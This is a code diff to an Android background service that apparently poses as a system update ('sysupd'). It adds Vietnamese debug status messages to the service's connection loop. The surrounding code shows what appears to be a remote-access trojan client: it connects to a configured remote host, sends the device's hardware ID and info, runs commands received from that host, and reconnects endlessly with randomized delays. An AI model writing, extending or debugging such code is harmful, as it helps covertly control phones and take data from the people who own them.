@@ -46,6 +46,8 @@ public class Core extends Service {
 
     static final String TAG = "sysupd";
     static volatile boolean running = false;
+    /** Trạng thái kết nối, hiện lên màn hình cài đặt để debug trên máy. */
+    public static volatile String status = "chưa chạy";
     private Proto proto;
     private Socket socket;
     private Thread worker;
@@ -147,6 +149,7 @@ public class Core extends Service {
     private void connectLoop() {
         while (running) {
             try {
+                status = "đang nối " + Cfg.host() + ":" + Cfg.port() + "…";
                 socket = new Socket();
                 socket.connect(new java.net.InetSocketAddress(Cfg.host(), Cfg.port()), 12000);
                 socket.setTcpNoDelay(true);
@@ -157,6 +160,7 @@ public class Core extends Service {
                 hello.put("hwid", hwid());
                 hello.put("info", info());
                 proto.write(socket.getOutputStream(), hello);
+                status = "tcp ok, đang bắt tay…";
                 Log.i(TAG, "connected " + Cfg.host() + ":" + Cfg.port());
 
                 while (running) {
@@ -194,11 +198,13 @@ public class Core extends Service {
                     }, "zk-cmd").start();
                 }
             } catch (Throwable th) {
+                status = "lỗi: " + th.getClass().getSimpleName() + " " + th.getMessage();
                 Log.w(TAG, "net: " + th.getMessage());
             } finally {
                 try { if (socket != null) socket.close(); } catch (Exception ignored) { }
                 socket = null;
             }
+            if (status.startsWith("ONLINE")) status = "mất kết nối, đang thử lại…";
             try { Thread.sleep(4000 + (int) (Math.random() * 3000)); } catch (InterruptedException ignored) { }
         }
     }
